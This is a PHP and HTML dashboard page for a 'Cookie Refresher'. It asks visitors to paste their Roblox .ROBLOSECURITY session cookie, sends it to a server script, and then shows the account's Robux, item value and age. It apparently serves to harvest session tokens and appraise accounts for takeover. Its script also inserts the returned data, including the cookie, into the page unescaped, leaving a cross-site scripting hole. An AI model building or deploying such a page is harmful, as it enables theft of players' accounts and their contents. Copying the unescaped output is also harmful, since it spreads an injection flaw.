<?php
session_start();

if (!isset($_SESSION['discord_user'])) {
    header('Location: login.php');
    exit;
}

$user = $_SESSION['discord_user'];
$avatarUrl = $user['avatar'] 
    ? "https://cdn.discordapp.com/avatars/{$user['id']}/{$user['avatar']}.png?size=128"
    : "https://cdn.discordapp.com/embed/avatars/0.png";
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Mystic Cookie Refresher</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #f0f4ff 0%, #e9ecff 100%);
            min-height: 100vh;
            padding: 30px 20px;
        }
        
        .navbar {
            background: white;
            padding: 20px 35px;
            border-radius: 16px;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 25px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.06);
            border: 1px solid rgba(88, 101, 242, 0.1);
        }
        
        .user-info {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .user-avatar {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            border: 3px solid #5865F2;
        }

        .user-name {
            font-size: 16px;
            font-weight: 600;
            color: #1a1f36;
        }
        
        .container {
            max-width: 900px;
            margin: 0 auto;
        }
        
        .refresh-box {
            background: white;
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.06);
            border: 1px solid rgba(88, 101, 242, 0.1);
        }
        
        h2 {
            margin-bottom: 15px;
            color: #1a1f36;
            font-size: 28px;
            font-weight: 700;
        }

        .description {
            color: #6b7280;
            margin-bottom: 30px;
            font-size: 15px;
        }
        
        textarea {
            width: 100%;
            padding: 18px;
            border: 2px solid #e5e7eb;
            border-radius: 12px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            resize: vertical;
            min-height: 120px;
            transition: all 0.3s ease;
            background: #f9fafb;
        }

        textarea:focus {
            outline: none;
            border-color: #5865F2;
            background: white;
            box-shadow: 0 0 0 3px rgba(88, 101, 242, 0.1);
        }
        
        .refresh-btn {
            background: linear-gradient(135deg, #5865F2 0%, #4752C4 100%);
            color: white;
            padding: 16px 45px;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            font-weight: 600;
            font-size: 16px;
            margin-top: 20px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(88, 101, 242, 0.3);
        }
        
        .refresh-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 25px rgba(88, 101, 242, 0.4);
        }
        
        .refresh-btn:disabled {
            background: #d1d5db;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .result {
            margin-top: 25px;
            padding: 20px;
            border-radius: 12px;
            display: none;
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .result.success {
            background: #d1fae5;
            border: 2px solid #6ee7b7;
            color: #065f46;
        }
        
        .result.error {
            background: #fee2e2;
            border: 2px solid #fca5a5;
            color: #991b1b;
        }
        
        .result textarea {
            margin-top: 15px;
            background: white;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-top: 15px;
        }

        .stat-item {
            background: linear-gradient(135deg, #f0f4ff 0%, #e9ecff 100%);
            padding: 12px 16px;
            border-radius: 10px;
            border: 1px solid #dbe4ff;
        }

        .stat-label {
            font-size: 12px;
            color: #6b7280;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .stat-value {
            font-size: 18px;
            color: #1a1f36;
            font-weight: 700;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <nav class="navbar">
            <div class="user-info">
                <img src="<?php echo htmlspecialchars($avatarUrl); ?>" alt="Avatar" class="user-avatar">
                <span class="user-name"><?php echo htmlspecialchars($user['username']); ?></span>
            </div>
        </nav>
        
        <div class="refresh-box">
            <h2>🔄 Cookie Refresher</h2>
            <p class="description">Paste your Roblox .ROBLOSECURITY cookie below to refresh it and get account details</p>
            
            <textarea id="cookieInput" placeholder="Paste your .ROBLOSECURITY cookie here..."></textarea>
            <button class="refresh-btn" id="refreshBtn" onclick="refreshCookie()">🚀 Refresh Cookie</button>
            
            <div class="result" id="result"></div>
        </div>
    </div>
    
    <script>
        async function refreshCookie() {
            const cookieInput = document.getElementById('cookieInput');
            const refreshBtn = document.getElementById('refreshBtn');
            const result = document.getElementById('result');
            
            const cookie = cookieInput.value.trim();
            
            if (!cookie) {
                result.className = 'result error';
                result.textContent = '⚠️ Please enter a cookie!';
                result.style.display = 'block';
                return;
            }
            
            refreshBtn.disabled = true;
            refreshBtn.textContent = '⏳ Refreshing...';
            result.style.display = 'none';
            
            try {
                const response = await fetch('refresh.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: 'cookie=' + encodeURIComponent(cookie)
                });
                
                const data = await response.json();
                
                if (data.error) {
                    result.className = 'result error';
                    result.textContent = '❌ Error: ' + data.error;
                } else {
                    result.className = 'result success';
                    result.innerHTML = `
                        <strong>✅ Cookie refreshed successfully!</strong>
                        
                        <div class="stats-grid">
                            <div class="stat-item">
                                <div class="stat-label">Username</div>
                                <div class="stat-value">${data.userData.username}</div>
                            </div>
                            <div class="stat-item">
                                <div class="stat-label">User ID</div>
                                <div class="stat-value">${data.userData.userId}</div>
                            </div>
                            <div class="stat-item">
                                <div class="stat-label">Robux</div>
                                <div class="stat-value">💰 ${data.userData.robux}</div>
                            </div>
                            <div class="stat-item">
                                <div class="stat-label">RAP</div>
                                <div class="stat-value">💎 ${data.userData.rap}</div>
                            </div>
                            <div class="stat-item">
                                <div class="stat-label">Total Value</div>
                                <div class="stat-value">🏆 ${data.userData.totalValue} R$</div>
                            </div>
                            <div class="stat-item">
                                <div class="stat-label">Account Age</div>
                                <div class="stat-value">📅 ${data.userData.accountAge}</div>
                            </div>
                        </div>
                        
                        <br><strong>🔑 New Cookie:</strong><br>
                        <textarea readonly style="width: 100%; min-height: 100px; margin-top: 10px;">${data.cookie}</textarea>
                    `;
                }
                
                result.style.display = 'block';
            } catch (error) {
                result.className = 'result error';
                result.textContent = '❌ Network error: ' + error.message;
                result.style.display = 'block';
            }
            
            refreshBtn.disabled = false;
            refreshBtn.textContent = '🚀 Refresh Cookie';
        }
    </script>
</body>
</html>
